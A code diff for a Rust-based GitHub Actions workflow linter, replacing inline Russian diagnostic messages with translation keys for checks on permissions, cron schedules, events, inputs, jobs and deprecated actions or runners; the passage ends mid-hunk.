@@ -27,34 +27,34 @@ const GH_INPUT_TYPES: [&str; 5] = ["string", "boolean", "choice", "number", "env
 
 fn retired_runner(label: &str) -> Option<String> {
     Some(match label {
-        "ubuntu-16.04" => tr!("сентябрь 2021"),
-        "ubuntu-18.04" => tr!("апрель 2023"),
-        "ubuntu-20.04" => tr!("апрель 2025"),
-        "macos-10.15" => tr!("август 2022"),
-        "macos-11" => tr!("июнь 2024"),
-        "macos-12" => tr!("декабрь 2024"),
-        "macos-13" => tr!("декабрь 2025"),
-        "windows-2016" => tr!("март 2022"),
-        "windows-2019" => tr!("июнь 2025"),
+        "ubuntu-16.04" => tr!("september-2021"),
+        "ubuntu-18.04" => tr!("april-2023"),
+        "ubuntu-20.04" => tr!("april-2025"),
+        "macos-10.15" => tr!("august-2022"),
+        "macos-11" => tr!("june-2024"),
+        "macos-12" => tr!("december-2024"),
+        "macos-13" => tr!("december-2025"),
+        "windows-2016" => tr!("march-2022"),
+        "windows-2019" => tr!("june-2025"),
         _ => return None,
     })
 }
 
 /// Действие, последняя устаревшая версия, серьёзность, ключ перевода, рекомендуемая версия.
 const OLD_ACTIONS: [(&str, f64, bool, &str, &str); 9] = [
-    ("actions/upload-artifact", 3.0, true, "Задание упадёт сразу: «This request has been automatically failed because it uses a deprecated version of `actions/upload-artifact: v3`».", "v4"),
-    ("actions/download-artifact", 3.0, true, "Задание упадёт сразу: «This request has been automatically failed because it uses a deprecated version of `actions/download-artifact: v3`».", "v4"),
-    ("actions/cache", 2.0, true, "Задание упадёт: с февраля 2025 старые версии actions/cache отключены (сервис кэша v1 выключен).", "v4"),
-    ("actions/checkout", 3.0, false, "Работает с предупреждением «Node.js 16/20 actions are deprecated» и может перестать запускаться, когда GitHub отключит старый Node.js.", "v5"),
-    ("actions/setup-node", 3.0, false, "Работает с предупреждением об устаревшем Node.js, позже может перестать запускаться.", "v5"),
-    ("actions/setup-python", 4.0, false, "Работает с предупреждением об устаревшем Node.js.", "v6"),
-    ("actions/setup-java", 3.0, false, "Работает с предупреждением об устаревшем Node.js.", "v5"),
-    ("actions/setup-go", 4.0, false, "Работает с предупреждением об устаревшем Node.js.", "v6"),
-    ("actions/github-script", 6.0, false, "Работает с предупреждением об устаревшем Node.js.", "v8"),
+    ("actions/upload-artifact", 3.0, true, "job-will-fail-right-away", "v4"),
+    ("actions/download-artifact", 3.0, true, "job-will-fail-right-away-this", "v4"),
+    ("actions/cache", 2.0, true, "job-will-fail-since-february", "v4"),
+    ("actions/checkout", 3.0, false, "works-with-warning-node-js", "v5"),
+    ("actions/setup-node", 3.0, false, "works-with-deprecated-node-js", "v5"),
+    ("actions/setup-python", 4.0, false, "works-with-deprecated-node-js-warning", "v6"),
+    ("actions/setup-java", 3.0, false, "works-with-deprecated-node-js-warning", "v5"),
+    ("actions/setup-go", 4.0, false, "works-with-deprecated-node-js-warning", "v6"),
+    ("actions/github-script", 6.0, false, "works-with-deprecated-node-js-warning", "v8"),
 ];
 
 fn gh_rejected(message: impl std::fmt::Display) -> String {
-    tr!("GitHub не запустит workflow: «Invalid workflow file … {0}». На вкладке Actions будет красная ошибка с этим текстом.", message)
+    tr!("github-wont-run-workflow-invalid", message)
 }
 
 enum Cron {
@@ -68,10 +68,10 @@ fn cron_problem(cron: &str) -> Cron {
     let fields: Vec<&str> = gorynych_core::js::trim(cron).split(gorynych_core::js::is_whitespace).filter(|part| !part.is_empty()).collect();
     let count = if gorynych_core::js::trim(cron).is_empty() { 1 } else { fields.len() };
     if count != 5 {
-        return Cron::Error(tr!("нужно 5 полей (минуты часы день месяц день_недели), а здесь {0}", count));
+        return Cron::Error(tr!("n-5-fields-are-needed", count));
     }
     let ranges = [(0.0, 59.0), (0.0, 23.0), (1.0, 31.0), (1.0, 12.0), (0.0, 6.0)];
-    let names = [tr!("минуты"), tr!("часы"), tr!("день месяца"), tr!("месяц"), tr!("день недели")];
+    let names = [tr!("minutes"), tr!("hours"), tr!("day-of-month"), tr!("month"), tr!("day-of-week")];
     for index in 0..5 {
         let mut value = fields[index].to_uppercase();
         for (at, month) in ["JAN", "FEB", "MAR", "APR", "MAY", "JUN", "JUL", "AUG", "SEP", "OCT", "NOV", "DEC"].iter().enumerate() {
@@ -82,17 +82,17 @@ fn cron_problem(cron: &str) -> Cron {
         }
         for part in value.split(',') {
             let Some(groups) = re!(r"^(\*|(\d+)(?:-(\d+))?)(?:\/(\d+))?$").exec(part) else {
-                return Cron::Error(tr!("поле «{0}»: непонятное значение {1}", names[index], q(fields[index])));
+                return Cron::Error(tr!("field-unrecognized-value", names[index], q(fields[index])));
             };
             for number in [&groups[2], &groups[3]].into_iter().flatten() {
                 let number = number_of_text(number);
                 let (low, high) = ranges[index];
                 if number < low || number > high + if index == 4 { 1.0 } else { 0.0 } {
-                    return Cron::Error(tr!("поле «{0}»: {1} вне диапазона {2}–{3}", names[index], gorynych_core::js::number_to_string(number), low, high));
+                    return Cron::Error(tr!("field-is-out-of-range", names[index], gorynych_core::js::number_to_string(number), low, high));
                 }
             }
             if groups[4].as_deref() == Some("0") {
-                return Cron::Error(tr!("поле «{0}»: шаг /0", names[index]));
+                return Cron::Error(tr!("field-step-0", names[index]));
             }
         }
     }
@@ -166,9 +166,9 @@ impl Github<'_, '_, '_> {
         let Some(perms) = perms else { return };
         if let Value::String(text) = perms {
             if !matches!(text.as_str(), "read-all" | "write-all" | "{}") {
-                self.issue(path, draft!("gh-perms-value", Error, title = format!("permissions: {text}"), how = gh_rejected(format!("Unexpected value '{text}'")), why = tr!("Строкой можно указать только read-all или write-all."), fix = "permissions:\n  contents: read"));
+                self.issue(path, draft!("gh-perms-value", Error, title = format!("permissions: {text}"), how = gh_rejected(format!("Unexpected value '{text}'")), why = tr!("as-string-only-read-all"), fix = "permissions:\n  contents: read"));
             } else if text == "write-all" {
-                self.issue(path, draft!("gh-perms-write-all", Info, title = "permissions: write-all", when = tr!("При каждом запуске"), how = tr!("Токен GITHUB_TOKEN получит право записи во всё — если какой-то шаг (стороннее действие) скомпрометирован, он сможет менять код и релизы."), why = tr!("Широкие права без необходимости."), fix = tr!("Перечислите только нужные права: contents: read, pull-requests: write…")));
+                self.issue(path, draft!("gh-perms-write-all", Info, title = "permissions: write-all", when = tr!("on-every-run"), how = tr!("github-token-will-get-write"), why = tr!("broad-permissions-without-need"), fix = tr!("list-only-needed-permissions-contents")));
             }
             return;
         }
@@ -176,9 +176,9 @@ impl Github<'_, '_, '_> {
         for (key, value) in map.iter() {
             let sub = extend(path, kp![key]);
             if !GH_PERMS.contains(&key.as_str()) {
-                self.issue(&sub, draft!("gh-perms-scope", Error, title = tr!("permissions: неизвестное право {0}", q(key)), how = gh_rejected(format!("Unexpected value '{key}'")), why = tr!("Права: {0}.{1}", GH_PERMS.join(", "), did_you_mean(key, GH_PERMS)), fix = tr!("Исправьте имя права.")));
+                self.issue(&sub, draft!("gh-perms-scope", Error, title = tr!("permissions-unknown-permission", q(key)), how = gh_rejected(format!("Unexpected value '{key}'")), why = tr!("permissions", GH_PERMS.join(", "), did_you_mean(key, GH_PERMS)), fix = tr!("fix-permission-name")));
             } else if !matches!(value.as_str(), Some("read" | "write" | "none")) || (key == "id-token" && value.as_str() == Some("read")) || (key == "models" && value.as_str() == Some("write")) {
-                self.issue(&sub, draft!("gh-perms-level", Error, title = format!("permissions: {key}: {}", value.js_string()), how = gh_rejected(format!("Unexpected value '{}'", value.js_string())), why = if key == "id-token" { tr!("id-token допускает только write или none.") } else { tr!("Значение — read, write или none.") }, fix = format!("{key}: {}", if key == "id-token" { "write" } else { "read" })));
+                self.issue(&sub, draft!("gh-perms-level", Error, title = format!("permissions: {key}: {}", value.js_string()), how = gh_rejected(format!("Unexpected value '{}'", value.js_string())), why = if key == "id-token" { tr!("id-token-allows-only-write") } else { tr!("value-is-read-write-or") }, fix = format!("{key}: {}", if key == "id-token" { "write" } else { "read" })));
             }
         }
     }
@@ -186,13 +186,13 @@ impl Github<'_, '_, '_> {
     fn check_if(&mut self, condition: &Value, path: &[PathItem], job: &str, job_level: bool) {
         let text = condition.js_string();
         if re!(r"\bsecrets\.").test(&text) {
-            let fix = format!("{}{}.", tr!("Перенесите секрет в env и проверяйте env.MY_SECRET != ''"), if job_level { tr!(" на уровне шага") } else { String::new() });
-            self.issue(path, draft!("gh-if-secrets", Error, title = tr!("{0}: secrets в условии if", q(job)), how = gh_rejected("Unrecognized named-value: 'secrets'"), why = tr!("Контекст secrets недоступен в if (чтобы условие не раскрывало секрет)."), fix = fix, job = job.to_owned()));
+            let fix = format!("{}{}.", tr!("move-secret-to-env-and"), if job_level { tr!("at-step-level") } else { String::new() });
+            self.issue(path, draft!("gh-if-secrets", Error, title = tr!("secrets-in-if-condition", q(job)), how = gh_rejected("Unrecognized named-value: 'secrets'"), why = tr!("secrets-context-isnt-available-in"), fix = fix, job = job.to_owned()));
         }
         if let Some(groups) = re!(r"^\s*\$\{\{([\s\S]*?)\}\}\s*(\S[\s\S]*)$").exec(&text) {
             let inner = groups[1].clone().unwrap_or_default();
             let rest = groups[2].clone().unwrap_or_default();
-            self.issue(path, draft!("gh-if-always-true", Warning, title = tr!("{0}: условие {1} всегда истинно", q(job), q(&text)), when = tr!("При каждом запуске"), how = tr!("Шаг/задание выполнится всегда: после ${{ … }} идёт текст, и всё выражение становится непустой строкой."), why = tr!("Если ${{ }} занимает не всё условие, GitHub подставляет результат в строку, а непустая строка — истина."), fix = tr!("Уберите ${{ }} или оберните им всё условие: if: ${{ {0} {1} }}", gorynych_core::js::trim(&inner), rest), job = job.to_owned()));
+            self.issue(path, draft!("gh-if-always-true", Warning, title = tr!("condition-is-always-true", q(job), q(&text)), when = tr!("on-every-run"), how = tr!("step-job-will-always-run"), why = tr!("if-doesnt-cover-whole-condition"), fix = tr!("remove-or-wrap-whole-condition", gorynych_core::js::trim(&inner), rest), job = job.to_owned()));
         }
     }
 }
@@ -204,19 +204,19 @@ pub(crate) fn check_github(files: &[crate::load::model::CiFile], cx: &mut CheckC
     let Ok(data) = document.to_value(Schema::Plain, text) else { return Ok(()) };
     let data = if data.is_null() { Value::Map(JsMap::new()) } else { data };
     let Value::Map(top) = &data else { return Ok(()) };
-    let mut gh = Github { cx, file, when: tr!("Сразу при push — GitHub проверяет файл workflow до запуска") };
+    let mut gh = Github { cx, file, when: tr!("right-on-push-github-checks") };
 
     for key in top.keys() {
         if !GH_TOP.contains(&key.as_str()) {
-            gh.issue(&kp![key], draft!("gh-unknown-top", Error, title = tr!("Неизвестный раздел {0}", q(key)), how = gh_rejected(format!("Unexpected value '{key}'")), why = tr!("На верхнем уровне допустимы: {0}.{1}", GH_TOP.join(", "), did_you_mean(key, GH_TOP)), fix = tr!("Исправьте или удалите раздел.")));
+            gh.issue(&kp![key], draft!("gh-unknown-top", Error, title = tr!("unknown-section", q(key)), how = gh_rejected(format!("Unexpected value '{key}'")), why = tr!("allowed-at-top-level", GH_TOP.join(", "), did_you_mean(key, GH_TOP)), fix = tr!("fix-or-delete-section")));
         }
     }
     let on = non_null(data.get("on")).or_else(|| data.get("true"));
     if on.is_none() {
-        gh.issue(&[], draft!("gh-no-on", Error, title = tr!("Не указано, когда запускать (on)"), how = gh_rejected("Required property is missing: on"), why = tr!("Без on GitHub не знает, на какие события реагировать."), fix = "on:\n  push:\n    branches: [main]\n  pull_request:"));
+        gh.issue(&[], draft!("gh-no-on", Error, title = tr!("when-to-run-isnt-specified"), how = gh_rejected("Required property is missing: on"), why = tr!("without-on-github-doesnt-know"), fix = "on:\n  push:\n    branches: [main]\n  pull_request:"));
     }
     if data.get("jobs").is_none() {
-        gh.issue(&[], draft!("gh-no-jobs", Error, title = tr!("Нет раздела jobs"), how = gh_rejected("Required property is missing: jobs"), why = tr!("Workflow без заданий ничего не делает."), fix = "jobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v5"));
+        gh.issue(&[], draft!("gh-no-jobs", Error, title = tr!("no-jobs-section"), how = gh_rejected("Required property is missing: jobs"), why = tr!("workflow-without-jobs-does-nothing"), fix = "jobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v5"));
     }
 
     // События
@@ -242,19 +242,19 @@ pub(crate) fn check_github(files: &[crate::load::model::CiFile], cx: &mut CheckC
             kp!["on", event]
         };
         if !GH_EVENTS.contains(&event.as_str()) {
-            gh.issue(&path, draft!("gh-event-unknown", Error, title = tr!("Неизвестное событие {0}", q(event)), how = gh_rejected(format!("Unexpected value '{event}'")), why = tr!("GitHub не знает такого события.{0}", did_you_mean(event, GH_EVENTS)), fix = tr!("Исправьте имя события.")));
+            gh.issue(&path, draft!("gh-event-unknown", Error, title = tr!("unknown-event", q(event)), how = gh_rejected(format!("Unexpected value '{event}'")), why = tr!("github-doesnt-know-this-event", did_you_mean(event, GH_EVENTS)), fix = tr!("fix-event-name")));
             continue;
         }
         if let Value::Map(config) = cfg {
             if matches!(event.as_str(), "push" | "pull_request" | "pull_request_target") {
                 for key in config.keys() {
                     if !GH_FILTERS.contains(&key.as_str()) {
-                        gh.issue(&extend(&path, kp![key]), draft!("gh-filter-unknown", Error, title = tr!("{0}: неизвестный фильтр {1}", event, q(key)), how = gh_rejected(format!("Unexpected value '{key}'")), why = tr!("Допустимы: {0}.{1}", GH_FILTERS.join(", "), did_you_mean(key, GH_FILTERS)), fix = tr!("Исправьте ключ.")));
+                        gh.issue(&extend(&path, kp![key]), draft!("gh-filter-unknown", Error, title = tr!("unknown-filter", event, q(key)), how = gh_rejected(format!("Unexpected value '{key}'")), why = tr!("allowed", GH_FILTERS.join(", "), did_you_mean(key, GH_FILTERS)), fix = tr!("fix-key")));
                     }
                 }
                 for (a, b) in [("branches", "branches-ignore"), ("tags", "tags-ignore"), ("paths", "paths-ignore")] {
                     if config.contains_key(a) && config.contains_key(b) {
-                        gh.issue(&extend(&path, kp![b]), draft!("gh-filter-both", Error, title = tr!("{0}: {1} и {2} вместе", event, a, b), how = gh_rejected(format!("you may only define one of `{a}` and `{b}` for a single event")), why = tr!("Нельзя одновременно включать и исключать в одном событии."), fix = tr!("Оставьте {0} и добавьте исключения через «!»: - '!release/**'", a)));
+                        gh.issue(&extend(&path, kp![b]), draft!("gh-filter-both", Error, title = tr!("and-together", event, a, b), how = gh_rejected(format!("you may only define one of `{a}` and `{b}` for a single event")), why = tr!("you-cant-include-and-exclude"), fix = tr!("keep-and-add-exclusions-with", a)));
                     }
                 }
             }
@@ -262,7 +262,7 @@ pub(crate) fn check_github(files: &[crate::load::model::CiFile], cx: &mut CheckC
                 let empty = JsMap::new();
                 let inputs = config.get("inputs").and_then(Value::as_map).unwrap_or(&empty);
                 if inputs.len() > 25 {
-                    gh.issue(&extend(&path, kp!["inputs"]), draft!("gh-inputs-limit", Error, title = tr!("{0}: больше 25 параметров", event), how = gh_rejected("you may only define up to 25 `inputs` for a `workflow_dispatch` event"), why = tr!("Ограничение GitHub."), fix = tr!("Объедините параметры (например, JSON в одной строке).")));
+                    gh.issue(&extend(&path, kp!["inputs"]), draft!("gh-inputs-limit", Error, title = tr!("more-than-25-inputs", event), how = gh_rejected("you may only define up to 25 `inputs` for a `workflow_dispatch` event"), why = tr!("github-limit"), fix = tr!("combine-inputs-for-example-json")));
                 }
                 for (name, input) in inputs.iter() {
                     if !matches!(input, Value::Map(_)) {
@@ -274,11 +274,11 @@ pub(crate) fn check_github(files: &[crate::load::model::CiFile], cx: &mut CheckC
                     if let Some(kind) = input_type
                         && !kind.as_str().is_some_and(|kind| types.contains(&kind))
                     {
-                        gh.issue(&extend(&path, kp!["inputs", name, "type"]), draft!("gh-input-type", Error, title = tr!("Параметр {0}: тип {1}", q(name), q(kind.js_string())), how = gh_rejected(format!("Unexpected value '{}'", kind.js_string())), why = tr!("Допустимые типы: {0}.{1}", types.join(", "), did_you_mean(&kind.js_string(), types.iter().copied())), fix = "type: string"));
+                        gh.issue(&extend(&path, kp!["inputs", name, "type"]), draft!("gh-input-type", Error, title = tr!("input-type", q(name), q(kind.js_string())), how = gh_rejected(format!("Unexpected value '{}'", kind.js_string())), why = tr!("allowed-types", types.join(", "), did_you_mean(&kind.js_string(), types.iter().copied())), fix = "type: string"));
                     }
                     let options = crate::load_common_as_array(input.get("options"));
                     if is_type("choice") && options.is_empty() {
-                        gh.issue(&extend(&path, kp!["inputs", name]), draft!("gh-choice-no-options", Error, title = tr!("Параметр {0}: choice без options", q(name)), how = gh_rejected("Required property is missing: options"), why = tr!("Для выбора из списка нужен сам список."), fix = "options:\n  - staging\n  - production"));
+                        gh.issue(&extend(&path, kp!["inputs", name]), draft!("gh-choice-no-options", Error, title = tr!("input-choice-without-options", q(name)), how = gh_rejected("Required property is missing: options"), why = tr!("picking-from-list-needs-list"), fix = "options:\n  - staging\n  - production"));
                     }
                     let default = input.get("default");
                     if is_type("choice")
@@ -287,13 +287,13 @@ pub(crate) fn check_github(files: &[crate::load::model::CiFile], cx: &mut CheckC
                         && !options.iter().any(|option| option.js_string() == default_value.js_string())
                     {
                         let list = crate::yaml::js_join(options.iter().copied(), ", ");
-                        gh.issue(&extend(&path, kp!["inputs", name, "default"]), draft!("gh-choice-default", Error, title = tr!("Параметр {0}: default не из options", q(name)), how = gh_rejected(format!("Default value '{}' is not in the list of options", default_value.js_string())), why = format!("options: {list}."), fix = tr!("Укажите default из списка.")));
+                        gh.issue(&extend(&path, kp!["inputs", name, "default"]), draft!("gh-choice-default", Error, title = tr!("input-default-isnt-in-options", q(name)), how = gh_rejected(format!("Default value '{}' is not in the list of options", default_value.js_string())), why = format!("options: {list}."), fix = tr!("set-default-to-value-from")));
                     }
                     if is_type("boolean")
                         && let Some(default_value) = default
                         && !matches!(default_value, Value::Bool(_))
                     {
-                        gh.issue(&extend(&path, kp!["inputs", name, "default"]), draft!("gh-boolean-default", Warning, title = tr!("Параметр {0}: default {1} для boolean", q(name), default_value.json_string()), how = tr!("Значение по умолчанию будет восприниматься как строка; сравнение inputs.x == true может не сработать."), why = tr!("Для boolean ожидается true/false без кавычек."), fix = "default: false"));
+                        gh.issue(&extend(&path, kp!["inputs", name, "default"]), draft!("gh-boolean-default", Warning, title = tr!("input-default-for-boolean", q(name), default_value.json_string()), how = tr!("default-value-will-be-treated"), why = tr!("boolean-expects-true-false-without"), fix = "default: false"));
                     }
                 }
             }
@@ -301,11 +301,11 @@ pub(crate) fn check_github(files: &[crate::load::model::CiFile], cx: &mut CheckC
         if event == "schedule" {
             let list = crate::load_common_as_array(Some(cfg));
             if list.is_empty() {
-                gh.issue(&path, draft!("gh-schedule-empty", Error, title = tr!("schedule без cron"), how = gh_rejected("Required property is missing: cron"), why = tr!("Нужно расписание."), fix = "schedule:\n  - cron: '0 3 * * *'"));
+                gh.issue(&path, draft!("gh-schedule-empty", Error, title = tr!("schedule-without-cron"), how = gh_rejected("Required property is missing: cron"), why = tr!("schedule-is-required"), fix = "schedule:\n  - cron: '0 3 * * *'"));
             }
             for (index, item) in list.into_iter().enumerate() {
                 let Some(cron) = item.get("cron") else {
-                    gh.issue(&extend(&path, kp![index]), draft!("gh-schedule-format", Error, title = tr!("schedule: запись без cron"), how = gh_rejected("Required property is missing: cron"), why = tr!("Каждая запись schedule — { cron: \"…\" }."), fix = "- cron: '0 3 * * *'"));
+                    gh.issue(&extend(&path, kp![index]), draft!("gh-schedule-format", Error, title = tr!("schedule-entry-without-cron"), how = gh_rejected("Required property is missing: cron"), why = tr!("each-schedule-entry-is-cron"), fix = "- cron: '0 3 * * *'"));
                     continue;
                 };
                 let cron_text = cron.js_string();
@@ -314,13 +314,13 @@ pub(crate) fn check_github(files: &[crate::load::model::CiFile], cx: &mut CheckC
                     Cron::Error(error) => {
                         let mut chars = error.chars();
                         let capital = chars.next().map_or_else(String::new, |first| first.to_uppercase().chain(chars).collect());
-                        gh.issue(&sub, draft!("gh-cron-invalid", Error, title = tr!("Неверное расписание {0}", q(&cron_text)), how = gh_rejected(format!("Invalid cron expression '{cron_text}'")), why = format!("{capital}."), fix = tr!("Например '30 2 * * 1-5' — по будням в 02:30 UTC.")));
+                        gh.issue(&sub, draft!("gh-cron-invalid", Error, title = tr!("invalid-schedule", q(&cron_text)), how = gh_rejected(format!("Invalid cron expression '{cron_text}'")), why = format!("{capital}."), fix = tr!("for-example-30-2-1")));
                     }
                     Cron::Frequent => {
-                        gh.issue(&sub, draft!("gh-cron-frequent", Warning, title = tr!("Расписание {0} — чаще раза в 5 минут", q(&cron_text)), when = tr!("По расписанию"), how = tr!("GitHub всё равно будет запускать не чаще раза в 5 минут, а в часы нагрузки — с задержкой или с пропусками."), why = tr!("Минимальный интервал расписаний в Actions — 5 минут."), fix = tr!("Используйте '*/5 * * * *' или реже.")));
+                        gh.issue(&sub, draft!("gh-cron-frequent", Warning, title = tr!("schedule-more-often-than-every", q(&cron_text)), when = tr!("on-schedule"), how = tr!("github-will-still-run-it"), why = tr!("minimum-schedule-interval-in-actions"), fix = tr!("use-5-or-less-often")));
                     }
                     Cron::Fine => {
-                        gh.issue(&sub, draft!("gh-cron-utc", Info, title = tr!("Расписание {0} — по UTC", q(&cron_text)), when = tr!("По расписанию"), how = tr!("Запуск будет по времени UTC, а не по вашему часовому поясу; в неактивных репозиториях (60 дней без коммитов) расписания отключаются."), why = tr!("Так устроены расписания в GitHub Actions."), fix = tr!("Переведите время в UTC (Москва = UTC+3).")));
+                        gh.issue(&sub, draft!("gh-cron-utc", Info, title = tr!("schedule-in-utc", q(&cron_text)), when = tr!("on-schedule"), how = tr!("it-will-run-on-utc"), why = tr!("thats-how-schedules-work-in"), fix = tr!("convert-time-to-utc-moscow")));
                     }
                 }
             }
@@ -344,7 +344,7 @@ pub(crate) fn check_github(files: &[crate::load::model::CiFile], cx: &mut CheckC
                 Some(end) => from = start + 3 + end + 2,
                 None => {
                     let shown = if gorynych_core::js::utf16_len(&text) > 60 { format!("{}…", String::from_utf16_lossy(&text.encode_utf16().take(60).collect::<Vec<_>>())) } else { text.clone() };
-                    gh.issue(&path, draft!("gh-expr-unclosed", Error, title = tr!("Не закрыто выражение ${{ … }}"), how = gh_rejected("An expression was expected / Unexpected end of expression"), why = tr!("В {0} нет закрывающих «}}».", q(shown)), fix = tr!("Добавьте «}}».")));
+                    gh.issue(&path, draft!("gh-expr-unclosed", Error, title = tr!("unclosed-expression"), how = gh_rejected("An expression was expected / Unexpected end of expression"), why = tr!("has-no-closing", q(shown)), fix = tr!("add")));
                     break;
                 }
             }
@@ -357,16 +357,16 @@ pub(crate) fn check_github(files: &[crate::load::model::CiFile], cx: &mut CheckC
         if !re!(r"^[A-Za-z_][A-Za-z0-9_-]*$").test(id) {
             let cleaned = re!(r"[^A-Za-z0-9_-]").replace_all(id, "-");
             let fixed = if cleaned.starts_with(|c: char| c.is_ascii_alphabetic() || c == '_') { cleaned } else { format!("_{cleaned}") };
-            gh.job_issue(&base, id, draft!("gh-job-id", Error, title = tr!("Недопустимый id задания {0}", q(id)), how = gh_rejected(format!("The identifier '{id}' is invalid. IDs may only contain alphanumeric characters, '_', and '-'. IDs must start with a letter or '_' and and must be less than 100 characters.")), why = tr!("id задания — латиница, цифры, «_» и «-», начинается с буквы или «_»."), fix = tr!("Переименуйте в {0}; человекочитаемое имя задайте через name:.", fixed)));
+            gh.job_issue(&base, id, draft!("gh-job-id", Error, title = tr!("invalid-job-id", q(id)), how = gh_rejected(format!("The identifier '{id}' is invalid. IDs may only contain alphanumeric characters, '_', and '-'. IDs must start with a letter or '_' and and must be less than 100 characters.")), why = tr!("job-id-is-latin-letters"), fix = tr!("rename-it-to-set-human", fixed)));
         }
         let Value::Map(job_map) = job else {
-            gh.job_issue(&base, id, draft!("gh-job-type", Error, title = tr!("{0}: задание должно быть картой", q(id)), how = gh_rejected(format!("Unexpected value '{}'", job.js_string())), why = tr!("Задание описывается ключами runs-on, steps…"), fix = format!("{id}:\n  runs-on: ubuntu-latest\n  steps: …")));
+            gh.job_issue(&base, id, draft!("gh-job-type", Error, title = tr!("job-must-be-map", q(id)), how = gh_rejected(format!("Unexpected value '{}'", job.js_string())), why = tr!("job-is-described-by-keys"), fix = format!("{id}:\n  runs-on: ubuntu-latest\n  steps: …")));
             continue;
         };
         for key in job_map.keys() {
             if !GH_JOB.contains(&key.as_str()) {
-                let hint = if key == "script" || key == "run" { tr!(" Команды пишутся в steps: - run: …") } else { String::new() };
-                gh.job_issue(&extend(&base, kp![key]), id, draft!("gh-job-key", Error, title = tr!("{0}: неизвестный ключ {1}", q(id), q(key)), how = gh_rejected(format!("Unexpected value '{key}'")), why = tr!("Допустимы: {0}.{1}{2}", GH_JOB.join(", "), did_you_mean(key, GH_JOB), hint), fix = tr!("Исправьте ключ.")));
+                let hint = if key == "script" || key == "run" { tr!("commands-are-written-in-steps") } else { String::new() };
+                gh.job_issue(&extend(&base, kp![key]), id, draft!("gh-job-key", Error, title = tr!("unknown-key", q(id), q(key)), how = gh_rejected(format!("Unexpected value '{key}'")), why = tr!("allowed-2", GH_JOB.join(", "), did_you_mean(key, GH_JOB), hint), fix = tr!("fix-key")));
             }
         }
         gh.check_perms(job.get("permissions"), &extend(&base, kp!["permissions"]));
@@ -375,32 +375,32 @@ pub(crate) fn check_github(files: &[crate::load::model::CiFile], cx: &mut CheckC
         for (index, need) in needs.iter().enumerate() {
             if !job_ids.contains(&need.as_str()) {
                 let sub = if matches!(job.get("needs"), Some(Value::Seq(_))) { kp!["needs", index] } else { kp!["needs"] };
-                gh.job_issue(&extend(&base, sub), id, draft!("gh-needs-unknown", Error, title = tr!("{0}: needs на неизвестное {1}", q(id), q(need)), how = gh_rejected(format!("Job '{id}' depends on unknown job '{need}'.")), why = tr!("Задания с id {0} нет (needs ссылается на id, а не на name).{1}", q(need), did_you_mean(need, job_ids.iter().copied())), fix = tr!("Исправьте id.")));
+                gh.job_issue(&extend(&base, sub), id, draft!("gh-needs-unknown", Error, title = tr!("needs-on-unknown", q(id), q(need)), how = gh_rejected(format!("Job '{id}' depends on unknown job '{need}'.")), why = tr!("theres-no-job-with-id", q(need), did_you_mean(need, job_ids.iter().copied())), fix = tr!("fix-id")));
             }
         }
         if let Some(uses) = job.get("uses") {
             let uses = uses.js_string();
             let sub = extend(&base, kp!["uses"]);
             if job.get("runs-on").is_some() || job.get("steps").is_some() {
-                gh.job_issue(&sub, id, draft!("gh-reusable-mixed", Error, title = tr!("{0}: uses вместе с runs-on/steps", q(id)), how = gh_rejected("Unexpected value 'runs-on'"), why = tr!("Задание, вызывающее переиспользуемый workflow (uses), не может иметь своих шагов."), fix = tr!("Оставьте uses + with/secrets или runs-on + steps.")));
+                gh.job_issue(&sub, id, draft!("gh-reusable-mixed", Error, title = tr!("uses-together-with-runs-on", q(id)), how = gh_rejected("Unexpected value 'runs-on'"), why = tr!("job-that-calls-reusable-workflow"), fix = tr!("keep-uses-with-secrets-or")));
             }
             if uses.starts_with("./") && !gh.cx.repo.has_file(&re!(r"@.*$").replace_all(&uses, "")) {
-                gh.job_issue(&sub, id, draft!("gh-reusable-missing", Error, title = tr!("{0}: нет файла {1}", q(id), uses), how = gh_rejected(format!("error parsing called workflow \"{uses}\": failed to fetch workflow: workflow was not found.")), why = tr!("Файла нет в репозитории."), fix = tr!("Проверьте путь (.github/workflows/…yml).")));
+                gh.job_issue(&sub, id, draft!("gh-reusable-missing", Error, title = tr!("no-file", q(id), uses), how = gh_rejected(format!("error parsing called workflow \"{uses}\": failed to fetch workflow: workflow was not found.")), why = tr!("file-isnt-in-repository"), fix = tr!("check-path-github-workflows-yml")));
             } else if !uses.starts_with("./") && !uses.contains('@') {
-                gh.job_issue(&sub, id, draft!("gh-reusable-ref", Error, title = tr!("{0}: uses без @версии", q(id)), how = gh_rejected("invalid value workflow reference: no version specified"), why = tr!("Для workflow из другого репозитория нужна версия: owner/repo/.github/workflows/x.yml@v1."), fix = format!("{uses}@main")));
+                gh.job_issue(&sub, id, draft!("gh-reusable-ref", Error, title = tr!("uses-without-version", q(id)), how = gh_rejected("invalid value workflow reference: no version specified"), why = tr!("workflow-from-another-repository-needs"), fix = format!("{uses}@main")));
             }
             continue;
         }
         let runs_on = job.get("runs-on");
         if runs_on.is_none() {
-            gh.job_issue(&base, id, draft!("gh-no-runs-on", Error, title = tr!("{0}: не указан runs-on", q(id)), how = gh_rejected("Required property is missing: runs-on"), why = tr!("Задание должно знать, на какой машине выполняться."), fix = "runs-on: ubuntu-latest"));
+            gh.job_issue(&base, id, draft!("gh-no-runs-on", Error, title = tr!("runs-on-isnt-specified", q(id)), how = gh_rejected("Required property is missing: runs-on"), why = tr!("job-must-know-which-machine"), fix = "runs-on: ubuntu-latest"));
         }
         let labels: Vec<String> = match runs_on {
             Some(map @ Value::Map(_)) => crate::load_common_as_array(map.get("labels")).into_iter().map(Value::js_string).collect(),
             other => crate::load_common_as_array(other).into_iter().map(Value::js_string).collect(),
         };
-        let when_running = tr!("При запуске задания {0}", q(id));
-        let when_executing = tr!("При выполнении задания {0}", q(id));
+        let when_running = tr!("when-job-runs", q(id));
+        let when_executing = tr!("when-job-runs-2", q(id));
         for label in &labels {
             if let Some(date) = retired_runner(label) {
                 let replacement = if label.starts_with("ubuntu") {
@@ -410,18 +410,18 @@ pub(crate) fn check_github(files: &[crate::load::model::CiFile], cx: &mut CheckC
                 } else {
                     "windows-2025"
                 };
